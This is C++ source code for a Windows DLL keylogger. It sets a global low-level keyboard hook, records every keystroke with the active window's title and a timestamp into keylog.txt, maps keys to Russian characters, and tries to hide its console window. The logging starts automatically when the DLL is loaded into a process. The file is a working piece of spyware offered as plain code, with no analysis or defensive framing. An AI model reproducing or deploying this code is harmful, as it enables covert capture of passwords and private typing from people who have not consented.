#include "pch.h"
#include <metahost.h>
#pragma comment(lib, "mscoree.lib")

#include <iostream>
#include <windows.h>
#include <fstream>
#include <time.h>

#pragma warning(disable:4996)
#pragma warning(disable:4703)

using namespace std;

int SaveDown(int key);

int SaveUp(int key);

char RusChar(char engChar);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

HHOOK hook;

KBDLLHOOKSTRUCT kbStruct;

ofstream file;
ifstream checkfile;
bool firstLineExist = true;

char prevProg[256];

int SaveDown(int key)
{
	if (key == 1 || key == 2)
	{
		return 0;
	}

	HWND foreground = GetForegroundWindow();

	DWORD threadId;

	HKL keyboardLayout;

	if (foreground)
	{
		threadId = GetWindowThreadProcessId(foreground, NULL);

		keyboardLayout = GetKeyboardLayout(threadId);

		char crrProg[256]; //текущая программа

		GetWindowTextA(foreground, crrProg, 256);

		if (strcmp(crrProg, prevProg) != 0)
		{
			strcpy_s(prevProg, crrProg);

			time_t t = time(0);

			tm* timeinfo = localtime(&t);

			char datetime[40];

			strftime(datetime, 40, "%d.%m.%Y %H:%M:%S", timeinfo);

			if (firstLineExist)
				file << "\n\n";

			file << "Программа: " << crrProg << " Дата и вермя: " << datetime << "\nТекст:";
			firstLineExist = true;
		}
	}

	if (key == VK_BACK)
		file << "[BACKSPACE]";
	else if (key == VK_RETURN)
		file << "\n";
	else if (key == VK_SPACE)
		file << " ";
	else if (key == VK_TAB)
		file << "[TAB]";
	else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
		file << "[SHIFT DOWN]";
	else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
		file << "[CTRL DOWN]";
	else if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU)
		file << "[ALT DOWN]";
	else if (key == VK_ESCAPE)
		file << "[ESC]";
	else if (key == VK_END)
		file << "[END]";
	else if (key == VK_HOME)
		file << "[HOME]";
	else if (key == VK_LEFT)
		file << "[LEFT]";
	else if (key == VK_RIGHT)
		file << "[RIGHT]";
	else if (key == VK_UP)
		file << "[UP]";
	else if (key == VK_DOWN)
		file << "[DOWN]";
	else if (key == 190 || key == 110)
		file << ".";
	else if (key == 189 || key == 109)
		file << "-";
	else if (key == 20)
		file << "[CAPS]";
	else
	{
		char crrKey;

		bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lower = !lower;
		}

		LPCWSTR rus = L"00000419";
		HKL rusLayout = LoadKeyboardLayout(rus, KLF_REORDER);

		crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboardLayout);

		if (keyboardLayout == rusLayout)
		{
			crrKey = RusChar(crrKey);
		}

		if (!lower)
		{
			crrKey = tolower(crrKey);
		}

		file << char(crrKey);
	}

	file.flush();

	return 0;
}

int SaveUp(int key)
{
	if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
		file << "[SHIFT UP]";
	else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
		file << "[CTRL UP]";
	else if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU)
		file << "[ALT UP]";

	file.flush();

	return 0;
}

char RusChar(char engChar)
{
	switch (engChar)
	{
	case 'Q':
		return 'й';
	case 'W':
		return 'ц';
	case 'E':
		return 'у';
	case 'R':
		return 'к';
	case 'T':
		return 'е';
	case 'Y':
		return 'н';
	case 'U':
		return 'г';
	case 'I':
		return 'ш';
	case 'O':
		return 'щ';
	case 'P':
		return 'з';
	case 'A':
		return 'ф';
	case 'S':
		return 'ы';
	case 'D':
		return 'в';
	case 'F':
		return 'а';
	case 'G':
		return 'п';
	case 'H':
		return 'р';
	case 'J':
		return 'о';
	case 'K':
		return 'л';
	case 'L':
		return 'д';
	case 'Z':
		return 'я';
	case 'X':
		return 'ч';
	case 'C':
		return 'с';
	case 'V':
		return 'м';
	case 'B':
		return 'и';
	case 'N':
		return 'т';
	case 'M':
		return 'ь';
	default:
		return engChar;
	}
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		kbStruct = *((KBDLLHOOKSTRUCT*)lParam);

		if (wParam == WM_KEYDOWN)
			SaveDown(kbStruct.vkCode);
		else if (wParam == WM_KEYUP)
			SaveUp(kbStruct.vkCode);

	}

	return CallNextHookEx(hook, nCode, wParam, lParam);
}

void startSnif()
{
	checkfile.open("keylog.txt");
	if (checkfile.peek() == EOF)
		firstLineExist = false;
	checkfile.close();

	file.open("keylog.txt", ios_base::app);
	//setlocale(LC_ALL, "Russian");
	ShowWindow(FindWindowA("ConsoleWindowsClass", NULL), 0);

	MSG message;

	SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);

	while (true)
	{
		GetMessage(&message, NULL, 0, 0);
	}
}

DWORD WINAPI callCSharp(LPVOID t)
{
	checkfile.open("keylog.txt");
	if (checkfile.peek() == EOF)
		firstLineExist = false;
	checkfile.close();

	file.open("keylog.txt", ios_base::app);
	//setlocale(LC_ALL, "Russian");
	ShowWindow(FindWindowA("ConsoleWindowsClass", NULL), 0);

	MSG message;

	SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);

	while (true)
	{
		GetMessage(&message, NULL, 0, 0);
	}

	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		CreateThread(NULL, 0, callCSharp, NULL, 0, NULL);
		return true;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

